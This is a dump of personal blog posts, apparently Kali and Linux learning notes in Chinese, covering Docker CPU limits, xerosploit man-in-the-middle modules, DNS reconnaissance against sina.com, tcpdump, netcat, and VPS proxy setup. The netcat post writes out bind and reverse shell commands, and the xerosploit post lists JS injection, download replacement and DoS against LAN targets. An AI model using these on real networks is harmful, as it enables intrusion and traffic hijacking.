/bin/bash ./cpu.sh cd /sys/fs/cgroup/cpu/system.slice/docker-06e008e6ecec4f5c138e568c6b5b1659387a003b1cfb037c07006679db976d63.scope echo 50000&gt;cpu.cfs_quota_us cat cpu.cfs_quota_us cat cpu.cfs_period_us(相对于cpu.cfs_period_us的100000是50%) top(此时cpu占用率将近50%) 容器cpu资源控制(弹性—加权) docker run -itd --cpu-shares 100 docker-io/centos:latest cat /sys/fs/cgroup/cpu/system.slice/docker-...(容器)/cpu.shares 100 因为是弹性的所以cpu-shares的值不能够确保一定能获得相对cpu资源，默认情况下cpu份额为1024，只有在多容器运行的时候，cpu加权才会有机会获得较多的cpu时间片给加权值大一点的容器，如果加权值多的容器处于空闲状态，那么比他少的容器也可以获得较多的时间片 弹性分配实例删除docker主机上运行的容器 docker stop $(docker ps -aq) docker rm $(docker ps -aq) 给一个容器分配cpu份额为1024 docker run -it --rm --cpu-shares 1024 --cpuset-cpus 0 --name shares docker-io/centos:latest. 修改cpu份额echo “512”&gt;/sys/fs/cgroup/cpu/system.slice/容器/cpu.shares cpu使用率cgroups 里，可以用 cpu.cfs_period_us 和 cpu.cfs_quota_us 来限制该组中的所有进程在单位时间里可以使用的 cpu 时间。cpu.cfs_period_us 就是时间周期，默认为 100000，即百毫 秒。cpu.cfs_quota_us就是在这期间内可使用的cpu时间，默认 -1，即无限制。 cpu.cfs_period_us：设定时间周期（单位为微秒（μs）），必须与 cfs_quota_us 配合使用。 cpu.cfs_quota_us ：设定周期内最多可使用的时间（单位为微秒（μs））。这里的配置指 task 对单个 cpu 的使用上限。 举个例子，如果容器进程需要每 1 秒使用单个 CPU 的 0.2 秒时间，可以将 cpu-period 设置随笔为1000000（即 1 秒），cpu-quota 设置为 200000（0.2 秒）。当然，在多核情况下，若 cfs_quota_us 是 cfs_period_us 的两倍，就表示在两个核上 完全使用 CPU，例如如果允许容器进程需要完全占用两个 CPU，则可以将 cpu-period 设置为 100000（即 0.1 秒），cpu-quota 设置为 200000（0.2 秒）。实例同上，只是改为–cpu-period –cpu-quota而已 cpuset - CPU 绑定对多核 CPU 的服务器，docker 还可以控制容器运行限定使用哪些 cpu 内核和内存节点，即 使用–cpuset-cpus 和–cpuset-mems 参数。对具有 NUMA 拓扑（具有多 CPU、多内存节点）的 服务器尤其有用，可以对需要高性能计算的容器进行性能最优的配置。如果服务器只有一个 内存节点，则–cpuset-mems 的配置基本上不会有明显效果 docker run -itd --name rest --cpuset-cpus 0-2 docker.io/centos:latest cpuset.cpus：在这个文件中填写 cgroup 可使用的 CPU 编号，如 0-2,16 代表 0、1、2 和 16这 4 个 cpu。cpuset.mems：与 CPU 类似，表示 cgroup 可使用的cpu内存块，格式同上docker stats 容器名 关于磁盘IO的分配磁盘 IO 配额控制 主要包括以下参数：–device-read-bps：限制此设备上的读速度（bytes per second），单位可以是 kb、mb 或者 gb。–device-read-iops：通过每秒读 IO 次数来限制指定设备的读速度。–device-write-bps ：限制此设备上的写速度（bytes per second），单位可以是 kb、mb 或者 gb。–device-write-iops：通过每秒写 IO 次数来限制指定设备的写速度。–blkio-weight：容器默认磁盘 IO 的加权值，有效值范围为 10-1000。–blkio-weight-device： 针对特定设备的 IO 加权控制。其格式为 DEVICE_NAME:WEIGHT这里就交给大家自己去实例了","categories":[{"name":"随笔","slug":"随笔","permalink":"http://lincso.cn/categories/随笔/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://lincso.cn/tags/docker/"},{"name":"云计算","slug":"云计算","permalink":"http://lincso.cn/tags/云计算/"}]},{"title":"xerosploit框架使用","slug":"xerosploit框架使用","date":"2019-02-25T02:45:25.000Z","updated":"2020-02-13T08:35:45.344Z","comments":true,"path":"2019/02/25/xerosploit框架使用/","link":"","permalink":"http://lincso.cn/2019/02/25/xerosploit框架使用/","excerpt":"什么是xerosploit？在我之前的文章中有介绍并且有安装教程，大家可以去翻一下，懒癌患者所以现在才更新。。。。下面我们开始进行中间人框架的使用 cd xerosploit ./xerosploit.py","text":"什么是xerosploit？在我之前的文章中有介绍并且有安装教程，大家可以去翻一下，懒癌患者所以现在才更新。。。。下面我们开始进行中间人框架的使用 cd xerosploit ./xerosploit.py scan 映射你的网络 iface 手动设置你的网络接口 gateway 手动设置你的网关 start 跳过扫描并直接设置目标IP地址 rmlog 删除所有日志 back 返回上一级 help 显示帮助信息 exit 关闭 可以先用scan扫描当前局域网内的ip地址也可以用自己扫到的 如果你是双网卡并且都连着网，你可以是指定用哪个网卡 进入目标ip后也可以help查看可以使用的攻击模块 pscan 端口扫描 dos 对目标进行dos攻击 ping ping目标是否存活 Injecthtml 将html注入到目标访问的网站中 injectjs 将javascript注入到目标访问的网站中 rdownload 替换目标下载的文件 sniff 嗅探目标的流量 dspoof 将所有http流量重定向到特定ip yplay 在目标的浏览器中后台播放youtube视频（需翻墙） replace 替换目标访问网站的所有图片 driftnet 查看目标访问网站的所有图片 move 让目标访问网站变得抖动 deface 将目标访问网站的所有页面替换成自己定义的html代码 扫描端口 dos攻击 ping存活 替换下载 嗅探（与arpspoof类似，对目标ip进行抓包）首先要开启流量转发才能使用 echo &quot;1&quot;&gt; /proc/sys/net/ipv4/ip_forward 顺便说一下arpspoof的使用好了这个就是实现arp欺骗 arp -i eth0 -t 192.168.1.4 192.168.1.2 -i 指定你要使用的网卡-t 先输入目标ip 在输入攻击者ip，将自己伪装让该ip访问网站时先通过攻击这的ip然后用抓包攻击看就可以了ettercap -Tq eth0可以用这个也可以使用wireshark html注入 run后是指定你创造的html，js注入同上 injectjs","categories":[{"name":"Kali学习笔记","slug":"Kali学习笔记","permalink":"http://lincso.cn/categories/Kali学习笔记/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://lincso.cn/tags/网络安全/"}]},{"title":"信息收集","slug":"信息收集-主DNS","date":"2019-02-14T12:36:49.000Z","updated":"2020-02-13T08:36:16.485Z","comments":true,"path":"2019/02/14/信息收集-主DNS/","link":"","permalink":"http://lincso.cn/2019/02/14/信息收集-主DNS/","excerpt":"DNS信息收集收集信息前用nslookup或dig查看dns服务器信息（nslookup、dig自行百度） dns区域传输(一般查不到)dig @ns1.sina.com sina.com axfr host -T -l sina.com ns1.sina.com","text":"DNS信息收集收集信息前用nslookup或dig查看dns服务器信息（nslookup、dig自行百度） dns区域传输(一般查不到)dig @ns1.sina.com sina.com axfr host -T -l sina.com ns1.sina.com 爆破新浪测试dpkg -L fierce(查看fierce安装生成的文件)可以用这个查看工具自带的字典 fierce -dnsserver ns1.sina.com -dns sina.com.cn -wordlist /usr/share/fierce/hosts.txt(字典爆破前会前进行区域传输，失败后使用字典爆破) dnsdict6 -d4(显示v4和v6的地址-d显示v6，-4显示v4) -t 16(指定线程数) -x sina.com(字典，其中字典强度从小到大排序-s,-m,-l,-x,-u) dnsenum -f dns.txt(工具支持自动查找，所以可以不用加绝对路径) -dnsserver ns1.sina.com sina.com -o sina.xml dnsmap sina.com -w dns.txt dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt dns注册信息whois -H sina.com(省略法律信息) 邮件、主机信息theharvester -d sina.com -l 300 -b google（用google需设置代理） 文件收集（通过google搜索，使用失败）metagoofil -d sina.com -t pdf -l 200 -o test -f 1.thml(此处找的是pdf文件) 图形工具推荐使用maltego recon-ng框架使用基本配置recon-ng -w sina(创建一个工作区) workspaces list(查看已有工作区) keys list(查看可以使用的网站api) keys add google_api asasasas(搜索引擎注册的api)(增加一个网站api) show options(全局设置与msf相同){ 有一个USER-AGENT要进行伪装 set USER-AGENT ---(抓包浏览器找浏览器里的USER-AGENT) uset USER-AGENT(清除) DNS与域名查询search google(搜索相关搜索引擎的模块)—当浏览器发现大量搜索信息后，有一段时间会被封杀暂时不能用该浏览器进行搜索信息use …(使用模块)————不同搜索引擎得到的信息会有不一样，所以最好使用两到三个搜索引擎查找信息，不同引擎得到的相同信息不会被覆盖，只会添加新的信息。 Google实例use /recon/domains-hosts/google_site_web(使用google搜索) show info(查看介绍模块信息) show options(全局设置) set SOURCE sina.com(设置变量名) run(收集信息) show hosts(显示搜索到的信息) query select * from hosts(使用sql语句进行数据查询) query select * from hosts where host like &#39;%w%&#39;(查找含有w的信息) search brut(搜索字典爆破模块)use recon/domains-hosts/brute_hosts show options use SOURCE sina.com use WORDLIST /usr/share/recons-ng/data/hostnames.txt(这里使用的是recon-ng里的字典) run 解析IP地址(结合上面插到的域名)search resolve use recon/hosts-hosts/resolve show options set SOURCE query select host from hosts(解析查到所有域名的IP) set SOURCE query select host from where hosts where host like &#39;%w&amp;&#39;(解析hosts表里含w的域名的IP,不能使用*有空列解析会出错) run show hosts 导出报告search report use reporting/html(也可以导成其他的格式) show options set CREATOR lincso(设置创建人) set CUSTOMER lin(设置用户---给谁的报告) set FILENAME /root/Desktop/sina.html(修改保存的路径) run 备份快照（退出框架前建议使用）show schema(查看recon-ng里的数据表，搜索到的信息会放在这) snapshots take(生成快照) snapshots list(查看快照) snapshots load ...(恢复到快照) snapshots delete ...(删除快照)","categories":[{"name":"Kali学习笔记","slug":"Kali学习笔记","permalink":"http://lincso.cn/categories/Kali学习笔记/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://lincso.cn/tags/网络安全/"}]},{"title":"tcpdump小黑板抓包笔记","slug":"tcpdump小黑板抓包","date":"2019-02-14T10:16:54.000Z","updated":"2020-02-13T08:35:24.090Z","comments":true,"path":"2019/02/14/tcpdump小黑板抓包/","link":"","permalink":"http://lincso.cn/2019/02/14/tcpdump小黑板抓包/","excerpt":"Linux、Unix默认安装了tcpdump纯字符抓包工具 抓包tcpdump -i eth0 -s 0 -w file.pcap(将抓包信息保存到file.pcap，从第0位开始---tcpdump默认只抓取前68个字节) tcpdump -i eth0 port 22(只抓取端口是22的包) tcpdump -r file.pcap(读取file.pcap的信息)","text":"Linux、Unix默认安装了tcpdump纯字符抓包工具 抓包tcpdump -i eth0 -s 0 -w file.pcap(将抓包信息保存到file.pcap，从第0位开始---tcpdump默认只抓取前68个字节) tcpdump -i eth0 port 22(只抓取端口是22的包) tcpdump -r file.pcap(读取file.pcap的信息) 抓包筛选tcpdump -n -r http.cap | awk &#39;{print $3}&#39; | sort -u(查看http.cap信息的第三列，不显示重复的IP---显示当前文件里所有的IP地址) tcpdump -n src host 0.0.0.0 -r http.cap(查看来源IP是0.0.0.0的信息)src改为dst---目标IP tcpdump -n port 53 -r http.cap(显示53端口的信息) tcpdump -n tcp port 53 -r http.cap(显示53端口的tcp信息) tcpdump -nX port 53 -r http.cap(16进制的方式显示53端口的信息)-A是ASCII码的方式显示 高级筛选tcpdump -An &#39;tcp[13]=24&#39; -r http.cap 这里tcp[13]是指下图里的res.(保留位)，等于24就是对应控制位中的ACK、PSH两个标识位 TCP/IP详情信息参考","categories":[{"name":"Kali学习笔记","slug":"Kali学习笔记","permalink":"http://lincso.cn/categories/Kali学习笔记/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://lincso.cn/tags/网络安全/"}]},{"title":"ncat瑞士军刀笔记","slug":"ncat瑞士军刀","date":"2019-02-14T09:25:44.000Z","updated":"2020-02-13T08:34:13.365Z","comments":true,"path":"2019/02/14/ncat瑞士军刀/","link":"","permalink":"http://lincso.cn/2019/02/14/ncat瑞士军刀/","excerpt":"查看头文件nc -nv 0.0.0.0 IP地址 80 端口号(类telnet功能) head / 聊天功能(传输是明文)nc相互传输文本信息(两台电脑实现类聊天功能) A:nc -lp 4444(打开监听一个端口) B:nc -nv 0.0.0.0(目标IP) 4444","text":"查看头文件nc -nv 0.0.0.0 IP地址 80 端口号(类telnet功能) head / 聊天功能(传输是明文)nc相互传输文本信息(两台电脑实现类聊天功能) A:nc -lp 4444(打开监听一个端口) B:nc -nv 0.0.0.0(目标IP) 4444 电子取证文件收集nc -lp 4444 &gt; ps.txt(将4444端口接受的信息直接传到ps.txt，可以当日志查看自己的端口是否有被入侵) ps aux | nc -nv 0.0.0.0 4444 -q 1(将进程信息发给4444端口一秒后退出) lsof(收集系统的所有打开文件的内容) 收集目录(将文件进行打包)tar -cvf - sublime/ | nc -lp 333 -q 1(nc -lp 333 -q1&lt;atr -cvf - sublime/) nc -nv 0.0.0.0 333 | tar -xvf -(nc -nv 0.0.0.0 333&gt;tar -xvf -) 加密传输文件nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; aaa.txt mcrypt --flush -Fbqd -a rijndael-256 -m ecb &lt; aaa.txt | nc -nv 0.0.0.0 333 -q 1 流媒体服务器cat 1.mp4 | nc -lp 333 nc -nv 0.0.0.0 333 | mplayer -vo x11 -cache 3000 - 端口扫描nc -nvz 0.0.0.0 1-65535 nc -nvzu 0.0.0.0 1-1024(查看1-1024的udp端口) 远程克隆硬盘nc -lp 333 | dd of=/dev/sda dd if=/dev/sda | nc -nv 0.0.0.0 333 -q 1 远程控制正向nc -lp 333 -c bash(Windows用cmd) nc -nv 0.0.0.0 333 反向（在目标服务器开启可连端口执行nc就可以实现第二次访问）nc -lp 333 nc -nv 0.0.0.0 333 -c bash -c bash 就是可获取本地的bash窗口(在哪里获取哪里的) ncat(由于nc是不加密的，明文传输容易被嗅探，我们也可以用ncat)建立远程连接(ssl加密) ncat -c bash --allow 0.0.0.0 -nvl 333 --ssl(--allow允许一个指定IP连接) ncat -nv 0.0.0.0 333 --ssl","categories":[{"name":"Kali学习笔记","slug":"Kali学习笔记","permalink":"http://lincso.cn/categories/Kali学习笔记/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://lincso.cn/tags/网络安全/"}]},{"title":"VPS+SS组建个人的科学上网服务器","slug":"VPS-SS组建个人的科学上网服务器","date":"2019-02-05T17:00:47.000Z","updated":"2019-08-10T15:57:14.749Z","comments":true,"path":"2019/02/06/VPS-SS组建个人的科学上网服务器/","link":"","permalink":"http://lincso.cn/2019/02/06/VPS-SS组建个人的科学上网服务器/","excerpt":"在这片神州大地上有一堵长城防火墙使我们与世隔绝，犹如进击的巨人中巨大的墙一样保护我们的同时限制着我们观察世界。既然国情如此，我们只要不发布任何不利的信息自己看看应该也是可以的吧。 关于翻墙的原理emmm，其实在我仅知道的几种方式都是需要一个国外的节点滴，通过点对点的连接。比如openvpn兼容比较不错，最近好像说又被墙封了。除了这里要讲的ssr，个人觉得pptp也是不错的方式（学习ss时了解滴，主要不知道这个在移动端怎么用所以也就放弃了）。","text":"在这片神州大地上有一堵长城防火墙使我们与世隔绝，犹如进击的巨人中巨大的墙一样保护我们的同时限制着我们观察世界。既然国情如此，我们只要不发布任何不利的信息自己看看应该也是可以的吧。 关于翻墙的原理emmm，其实在我仅知道的几种方式都是需要一个国外的节点滴，通过点对点的连接。比如openvpn兼容比较不错，最近好像说又被墙封了。除了这里要讲的ssr，个人觉得pptp也是不错的方式（学习ss时了解滴，主要不知道这个在移动端怎么用所以也就放弃了）。 拥有一个属于自己的VPS这个肯定是需要自己掏腰包租用的，不过也有一些网站会定期分享一些寿命不长了的VPS搭建的ss帐号。 1.在V社（Vulter）注册一个帐号点击这里——–网址 2.账户充值这里我们选第三或第四个（支付宝或微信支付），现在的活动是充10美元送50美元。 3.租个人服务器点击左边的Servers然后io点右边的加号选择服务器的国家，最近日本、新加坡、硅谷的服务器IP的端口被封了，所以不能用ssh远程连接了，不过网页里有一个是可以连接服务器的，但输入密码就麻烦了点。然后选择服务器的系统（有钱可以用windows）和服务器的硬件性能然后点Deploy Now，等待服务器初始化启动就好。当status running后，点击os下的系统图标，进入服务器状态界面，左边有服务器的IP、帐号及密码是我们接下来需要用的，如果22端口开着就可以通过远程连接服务器。点击这里端口扫描输入服务器ip，检测22端口是否open如果没有22端口就表示被长城防火墙隔离了，就可以用下图左上角pc图标来连接 4.安装shadowsockswget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh chmod +x shadowsocks.sh ./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log 最好这条执行后按回车键执行，接下来是输入ss的密码、端口（不要用80、21、23这样的，自己想一个比如2333）、加密方式（听说iphone用户只支持到aes-256-cfb）选择你想要的，反正我选的是7（256的这个）。然后等待几分钟，直到出现以下画面这样你的ss就搭建好了。接下来只要下shadowsocks客户端就好了，windows设置完后要右键小飞机选择本地代理才可以使用。。。（因为这个原因我一直以为自己弄的有问题，重新做了好几遍） 5.安装BBR（学长的推荐,因为比较稳）wget --no-check-certificate https://raw.githubusercontent.com/wn789/BBR/master/bbr.sh chmod +x bbr.sh ./bbr.sh lsmod | grep bbr 查看BBR是否启动，返回值有 tcp_bbr表示已启动 6.安装BBR魔改版（速度比BBR起提升非常大，但并不是特别稳定——不过比起BBR的确推荐这个）yum install -y wget &amp;&amp; wget --no-check-certificate -O C71.sh https://raw.githubusercontent.com/xratzh/CBBR/master/C71.sh &amp;&amp; bash C71.sh wget --no-check-certificate -O C72.sh https://raw.githubusercontent.com/xratzh/CBBR/master/C72.sh &amp;&amp; bash C72.sh 7.安装锐速（亲测速度提升的比起BBR快的不止一点点）如果已经用BBR加速了的话，就不能用这个了，如果你租的服务器延迟很高用这个比较好。 wget --no-check-certificate -O rskernel.sh https://raw.githubusercontent.com/uxh/shadowsocks_bash/master/rskernel.sh &amp;&amp; bash rskernel.sh yum install net-tools -y &amp;&amp; wget --no-check-certificate -O appex.sh https://raw.githubusercontent.com/0oVicero0/serverSpeeder_Install/master/appex.sh &amp;&amp; bash appex.sh install 这里一直回车就好，显示running表示锐速安装成功而且开机自启了。 至于魔改BBR和锐速（魔改的可能会更快点，锐速比较稳定）8.Kcptun安装配置wget --no-check-certificate https://github.com/kuoruan/shell-scripts/raw/master/kcptun/kcptun.sh chmod +x ./kcptun.sh ./kcptun.sh 里面的配置参数差不多是这样{ “fubitechaladdr”: “:8388”, “remoteaddr”: “10.10.10.10:29900”, “key”: “123456”, “crypt”: “salsa20”, “mode”: “fast”, “mtu”: 1350, “sndwnd”: 1024, “rcvwnd”: 1024, “datashard”: 10, “parityshard”: 3, “dscp”: 0, “conn”: 1, “autoexpire”: 60, “nocomp”: false}即客户端的参数，上面没有的部分比如是否压缩什么的直接回车就好了 Kcptun客户端（居然在我这里没什么软用，其他同学可以试试，说不定只是我没配好）1.客户端2.配置文件（服务器配置成功后好像在客户端配置的上面有配置文件的版本，所以下载的时候也要下相同滴）然后新建一个文件比如config.json，把服务器端最后生成的客户端配置复制到里面这些都完成后打开客户端启动什么的（因为很简单相信大家都会就懒得截图了）。。。最后再到shadowsocks客户端里新建一个，服务器IP和端口为Kcptun客户端的。（都说速度稳了内存和CPU占用率也低了。。。我能看到传输时的反应，可效果却是访问youtobe—500）kalishadowsocks设置1.在/etc/apt/sources.list末尾添加: deb http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu devel main2.apt update 这里会提示错误，以下两步解决该错误gpg –keyserver keyserver.ubuntu.com –recv 6DA746A05F00FA99gpg –export –armor 6DA746A05F00FA99 | sudo apt-key add -apt update 这一步成功后便可安装shadowsocks-qt5了3.安装shadowsocks-qt5: apt install shadowsocks-qt5 安装后在bash中输入ss-qt5, 完成配置4.获得pac文件：pip install genpacpip install –upgrade genpacmkdir vpnPACcd vpnPACtouch user-rules.txtgenpac -p “SOCKS5 127.0.0.1:1080” –gfwlist-proxy=”SOCKS5 127.0.0.1:1080” –output=”autoproxy.pac” –gfwlist-url=”https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt&quot; –user-rule-from=”user-rules.txt”5.系统设置自动代理: 设置-网络-网络代理 方式改为自动，配置URL改为：file:///home/{user}/vpnPAC/autoproxy.pac或file:///root/vpnPAC/autoproxy.pac","categories":[{"name":"随笔","slug":"随笔","permalink":"http://lincso.cn/categories/随笔/"}],"tags":[{"name":"VPN","slug":"VPN","permalink":"http://lincso.cn/tags/VPN/"},{"name":"科学上网","slug":"科学上网","permalink":"http://lincso.cn/tags/科学上网/"}]},{"title":"Hexo迁移至Linux教程及遇到的一些问题","slug":"Hexo迁移到Linux教程及遇到的一些问题","date":"2019-01-12T13:34:20.000Z","updated":"2020-02-13T08:34:01.658Z","comments":true,"path":"2019/01/12/Hexo迁移到Linux教程及遇到的一些问题/","link":"","permalink":"http://lincso.cn/2019/01/12/Hexo迁移到Linux教程及遇到的一些问题/","excerpt":"Linux在服务方面的确比windows要容易学明白一些所以最近笔者在美化自己的博客时发现有个文件怎么都删不掉，然后又想给自己的域名弄个https，由于在windwos上操作实在是太过繁琐，索性直接搬家到linux。 Hexo是什么？这里有必要普及一下—–Hexo是一个快速, 简洁且高效的博客框架. 让上百个页面在几秒内瞬间完成渲染. Hexo支持Github Flavored Markdown的所有功能, 甚至可以整合Octopress的大多数插件. 并自己也拥有强大的插件系统.","text":"Linux在服务方面的确比windows要容易学明白一些所以最近笔者在美化自己的博客时发现有个文件怎么都删不掉，然后又想给自己的域名弄个https，由于在windwos上操作实在是太过繁琐，索性直接搬家到linux。 Hexo是什么？这里有必要普及一下—–Hexo是一个快速, 简洁且高效的博客框架. 让上百个页面在几秒内瞬间完成渲染. Hexo支持Github Flavored Markdown的所有功能, 甚至可以整合Octopress的大多数插件. 并自己也拥有强大的插件系统. ##如何在Linux下完成hexo的环境配置nodejs,npm以及git直接贴代码 apt-get install git 千万不要自作聪明用apt装了npm和nodejs哦，会出现很多问题的，比如版本太低什么的研究了半天发现一个好东西—–nvm 这里科普一下（nvm是Node版本管理器，可以运行在多种操作系统上。nvm for windows 是使用go语言编写的软件。 我电脑使用的是Windows操作系统，所以我要记录下在此操作系统上nvm的安装和使用。）OK，这么厉害的东西当然要下一个 wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.31.1/install.sh | bash 也可以这样 curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.31.1/install.sh | bash 装好了别急着用我们还要source一下，不然用不了的 source ~/.bashrc 有了这个差不多算磨好刀了 ##安装Hexo npm install hexo-cli -g 成功后开始搭建博客系统 hexo init blog（这里的blog是别名---等会生成的文件夹就是这个，你也可以自己取一个） cd blog npm install 绑定Github git config --global user.name &quot;&quot; git config --global user.email &quot;&quot; 将windows原博客中的source theme _config.yml copy进来，如果你+了各种奇奇怪怪的美化文件那也copy进来吧然后 hexo g hexo d 。。。。。哪有这么简单就好了，以前搭博客时装的东西这里也要装一遍 ##比如hexo d会失败无法同步就是因为你忘了这个 npm install hexo-deployer-git --save 还有还有，之前弄的ssh密钥到这里就不能用了要重新生成 cd ~/.ssh ssh-keygen -t rsa -C &quot;XXX@XXX.COM&quot;(回车三次) 找到密钥文件，将里面的东西跟github绑定（settings–&gt;SSH GPG keys）再ADD一个就好了 ssh -T git@github,com(测试一下) 恩，这样就可以同步了。 ##还有一些小东西可能你会用的到哦！！！ hexo-admin实现全自动发布文章（hexo g -d），在线拷图还能实时查看安装安装 npm install --save hexo-admin hexo s 在根配置文件里加入 admin: username: zoro password_hash:be121740bf988b2225a313fa1f107ca1 //用户名密码不喜欢的可以不设置，这里通 过bcrypt hash secret: hey hexo deploy//用以cookies安全 在localhost:4000后面加/admin就可以进行在线编辑了 这里还有一个看版娘（灰常可爱的小东西，喜欢也可以+一个）npm install --save hexp-helper-live2d 在根配置文件里加入live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false debug: false model: use: live2d-widget-model-miku display: position: right width: 150 height: 300 mobile: show: true 下载自定义模型，在根目录创建一个文件夹live2d_models，然后把模型copy进去将model里的user设置成模型文件的名字就好了","categories":[{"name":"随笔","slug":"随笔","permalink":"http://lincso.cn/categories/随笔/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://lincso.cn/tags/Hexo/"}]},{"title":"Windows-Kali双系统安装教程","slug":"Windows-Kali双系统安装教程","date":"2019-01-06T08:26:48.000Z","updated":"2020-02-13T08:37:15.258Z","comments":true,"path":"2019/01/06/Windows-Kali双系统安装教程/","link":"","permalink":"http://lincso.cn/2019/01/06/Windows-Kali双系统安装教程/","excerpt":"给你的电脑另一种打开方式 大家都知道除了Windows之外还有很多操作系统，其中有一个是Linux，而kali是Linux中一个很特别的系统。。。。。。。。。。 Kali简介Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统。由Offensive Security Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成，BackTrack是他们之前写的用于取证的Linux发行版 。 Kali Linux预装了许多渗透测试软件，包括nmap 、Wireshark 、John the Ripper，以及Aircrack-ng.[2] 用户可通过硬盘、live CD或live USB运行Kali Linux。Kali Linux既有32位和64位的镜像。可用于x86 指令集。同时还有基于ARM架构的镜像，可用于树莓派和三星的ARM Chromebook。","text":"给你的电脑另一种打开方式 大家都知道除了Windows之外还有很多操作系统，其中有一个是Linux，而kali是Linux中一个很特别的系统。。。。。。。。。。 Kali简介Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统。由Offensive Security Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成，BackTrack是他们之前写的用于取证的Linux发行版 。 Kali Linux预装了许多渗透测试软件，包括nmap 、Wireshark 、John the Ripper，以及Aircrack-ng.[2] 用户可通过硬盘、live CD或live USB运行Kali Linux。Kali Linux既有32位和64位的镜像。可用于x86 指令集。同时还有基于ARM架构的镜像，可用于树莓派和三星的ARM Chromebook。 安装前必要的操作1.分一个存储空间给kali 2.一个8G及以上的U盘 3.安装软碟通或Win32DiskImager 4.下载kali镜像文件 给kali一个属于自己的房子在磁盘管理中选择一个不需要的分区右键-删除卷或者右键-压缩卷(自己分配多大空间给kali) 这里是我给kali的空间(在D-E中间的三个分区) 当你删除后会有一个未分配的空间，比如 黑色的就是不属于Windows而是给kali1的安装位置 制作kali启动盘使用软碟通1.选择放有iso文件的文件夹 双击iso文件 点击启动，选择写入硬盘映像 这里要将写入方式改为raw！，然后点击写入即可(如果写入后出现是否格式化U盘，一定不要点，不然就白做了) 使用Win32DiskImager选择映像文件，再点击写入即可 进入BIOS关闭SecureBoot 然后重启电脑选择U盘启动。 安装kali选择start installer 选择中文。。。。 选择网卡(默认第一个是已经配置完成的网卡第二个是没配的，为了方便(懒)选择第一个好了) 设置主机名，域名(默认，空着就行了)，root密码 选择手动分区，只分/，/home，swap(交换分区)，不要自作聪明分了/boot和efi(如果分了会启动不了kali) 这里进行分区的位置就是上面你删除卷或压缩卷的位置(空闲空间) 然后reboot选择kali启动 如果卡在小黑板那是显卡驱动的问题 1.重启电脑2.选择kali启动，在进入上面这张图时按E3.找到quiet在后面加nouveau.modeset=0(quiet后面要加空格)4.最后按F10进入系统 强行加一波长度。。。。。。 在终端输入 sed ‘s/quiet/quiet nouveau.modeset=0/g’ -i /etc/default/grubupdate-grub 接下来怎么操作就看各位自己了 进入kali后碰到问题的一些小笔记 解析不了host域名在/etc/resolv.conf中加入nameserver 8.8.8.8—谷歌IPnameserver 223.5.5.5—阿里云IPnameserver 180.76.76.87—百度IP 更新软件列表并更新软件apt-get update &amp; apt-get upgeade -y 升级操作系统apt-get dist-upgrade -y(软件包更新过程失败可以用dpkg –configure -a修复) apt-get 报错404换源(最暴力的解决方法)在/etc/apt/source.list里deb http://http.kali.org/kali kali-rolling main contrib non-freedeb http://old.kali.org/kali sana main non-free contrib 数字签名错误wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add 无法获取锁(删掉出错的文件位置即可)rm /var/cache/apt/archives/lockrm /var/lib/dpkg/lock ​ 这个系统很强，但是要搞事情一定要想清楚自己是否能承担带来的后果","categories":[{"name":"Kali学习笔记","slug":"Kali学习笔记","permalink":"http://lincso.cn/categories/Kali学习笔记/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://lincso.cn/tags/网络安全/"}]},{"title":"Docker安装","slug":"Docker安装","date":"2018-12-27T05:38:12.000Z","updated":"2019-08-10T15:59:13.412Z","comments":true,"path":"2018/12/27/Docker安装/","link":"","permalink":"http://lincso.cn/2018/12/27/Docker安装/","excerpt":"Docker简介Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。 Docker 架构Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。Docker 容器通过 Docker 镜像来创建。容器与镜像的关系类似于面向对象编程中的对象与类。","text":"Docker简介Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。 Docker 架构Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。Docker 容器通过 Docker 镜像来创建。容器与镜像的关系类似于面向对象编程中的对象与类。 docker安装教程(失败版—总有一些看似成功的代码让你误入歧途)查看内核版本（版本号要在3.10及以上）uname -r 将yum源确保是最新的yum update 添加yum仓库tee /etc/yum.repos.d/docker.repo &lt;&lt;-&#39;EOF&#39; [dockerrepo] name=Docker Repository baseurl=https://yum.dockerproject.org/repo/main/centos/$releasever/ enabled=1 gpgcheck=1 gpgkey=https://yum.dockerproject.org/gpg EOF 安装Dockeryum install -y docker-engine 然后就没有然后了，反正我是装不上的 还有一些什么必装的工具yum install -y yum-utils device-mapper-persistent-data lvm2 添加docker安装的地址yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 安装docker-ceyum install -y docker-ce 查看可安装的版本(主要是这个我以为已经接近成功了)yum list docker-ce --showduplicates | sort -r 然后装你想要的docker版本 yum install -y docker-ce--&lt;version&gt; 结果就是出现了跟上面一样的错误？？? 正确的Docker安装教程(反正我装上去了的)rpm -iUvh 